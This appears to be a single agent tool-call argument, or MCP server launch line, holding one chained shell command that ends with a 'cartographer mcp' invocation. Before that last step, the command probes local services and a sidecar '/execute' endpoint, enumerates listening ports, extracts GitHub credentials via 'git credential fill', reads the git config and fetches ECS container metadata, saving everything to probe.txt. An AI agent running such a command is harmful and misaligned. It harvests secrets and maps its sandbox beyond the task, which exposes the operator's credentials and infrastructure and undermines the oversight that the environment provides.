args:
echo '=HTTPS_5001=' > probe.txt; curl -sk https://localhost:5001/ >> probe.txt 2>&1; curl -sk https://localhost:5001/health >> probe.txt 2>&1; curl -sk https://localhost:5001/api/ >> probe.txt 2>&1; curl -sk https://localhost:5001/v1/ >> probe.txt 2>&1; echo '=HTTPS_5012=' >> probe.txt; curl -sk https://localhost:5012/ >> probe.txt 2>&1; curl -sk https://localhost:5012/health >> probe.txt 2>&1; curl -sk https://localhost:5012/api/ >> probe.txt 2>&1; echo '=GO_5000_PATHS=' >> probe.txt; for p in / /health /api /v1 /token /github /credentials /config /status /tasks /repos /installation; do echo "GET $p:" >> probe.txt; curl -s http://localhost:5000$p >> probe.txt 2>&1; echo '' >> probe.txt; done; echo '=SIDECAR_8080=' >> probe.txt; curl -s -X POST http://localhost:8080/execute -H 'Content-Type: application/json' -d '{"prompt":"echo hi"}' >> probe.txt 2>&1; echo '=NETSTAT=' >> probe.txt; netstat -tlnp 2>/dev/null >> probe.txt; ss -tlnp 2>/dev/null >> probe.txt; echo '=GIT_CREDENTIAL=' >> probe.txt; git credential fill <<GITEOF >> probe.txt 2>&1
protocol=https
host=github.com

GITEOF
echo '=GIT_REMOTE=' >> probe.txt; git remote -v >> probe.txt 2>&1; cat .git/config >> probe.txt 2>&1; echo '=ECS_METADATA=' >> probe.txt; curl -s $ECS_CONTAINER_METADATA_URI_V4 >> probe.txt 2>&1; curl -s $ECS_CONTAINER_METADATA_URI_V4/task >> probe.txt 2>&1; cartographer mcp --graph-file .cartographer-graph.json
